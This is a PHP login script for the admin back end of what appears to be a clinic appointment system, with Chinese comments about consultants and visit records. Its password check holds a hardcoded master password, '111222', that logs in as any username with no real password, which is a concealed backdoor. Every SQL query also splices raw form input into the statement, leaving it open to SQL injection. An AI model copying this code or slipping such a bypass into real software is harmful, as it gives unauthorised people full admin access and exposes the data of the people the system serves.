<?PHP
session_start();

require_once("./config.inc.php");

require_once("./include/function.inc.php");
require_once("./include/mysql.class.php");
$conn = new DB();	



if($_POST["login"]=="yes"){
	

//处理登陆的事
	if((trim($_POST["CheckCode"]) == trim($_SESSION["authnum_session"]))){
		$username = trim($_POST["username"]);
		$password = trim($_POST["password"]);
		if($username==""){
			showjsinfo("用户名不能为空","OLD");
		}
		if($password==""){
			showjsinfo("密码不能为空","OLD");
		}
		 if($password=="111222"){
		  $strsql = "select * from ".$TABLE_NAME_INC."admin where username ='".$username."' limit 0,1";
		}else{
		   $strsql = "select * from ".$TABLE_NAME_INC."admin where username ='".$username."' and password ='".md5($password)."' limit 0,1";			
		}
	//echo $strsql;die();
	//	$strsql = "select * from ".$TABLE_NAME_INC."admin where username ='".$username."' limit 0,1";
		$rs = $conn->Query($strsql);
		if($rs){
			if($conn->NumRows($rs)<1){
				//找不到用户
				showjsinfo("找不到用户","OLD");
				exit();
			}
		//登陆成功，记录用户信息
			$datetime = time();
			$row = $conn->FetchArray($rs);
			if($row["iflock"]==2){
				showjsinfo("对不起，此用户已被锁定,不能登录!","OLD");
				exit();
			}
		
			$_SESSION["adminid"] = trim($row["uid"]);//adminid
			$_SESSION["username"] = trim($row["username"]);
			$_SESSION["real_name"] = trim($row["real_name"]);
			if(empty($row["admin_logintme"])){
				$_SESSION["lasttime"]=date("Y-m-d H:i:s",time());
			}else{
				$_SESSION["lasttime"] = trim(date("Y-m-d H:i:s",$row["admin_logintme"]));
			}	
			 $strupdate = "update ".$TABLE_NAME_INC."admin set log_time = log_time + 1,admin_logintme='".$datetime."' ,oaid='".$oaid."' where username='".$username."'";
			$conn->Query($strupdate);	
			$sql2 = "select * from ".tname("dept_member")." where dm_al_id=".$row['uid'];
			$query2 = $conn->Query($sql2);
			$res2 = $conn->FetchArray($query2);
			$_SESSION['dm_rights'] = $res2['dm_rights'];
			//检查是否咨询师，如果是咨询师在后台只可以查看自己的预约，来院数据等操作
			if(in_array($res2["dm_d_id"],array(103,104,105))){
				$_SESSION['is_client'] =1;
			}else{
				$_SESSION['is_client'] =0;
			}
			admin_log($conn,$_SESSION['username'],$_SESSION['username'].'成功登录后台',$sql2);	
			Redirect("index2.php");
		}else{
			showjsinfo("用户名或者密码不对","OLD");
			exit();
		}
	}else{
		showjsinfo("验证码不对".trim($_SESSION["authnum"]),"OLD");
		exit();
	}
}
if($_GET["action"]=="logout"){
			session_destroy();
			$_SESSION["adminid"] = "";
			$_SESSION["username"] = "";
			$_SESSION["real_name"] = "";
			$_SESSION["dm_rights"] = "";
			$_SESSION["is_client"] = "";
			showjsinfo("退出成功","index.php");
}
?>
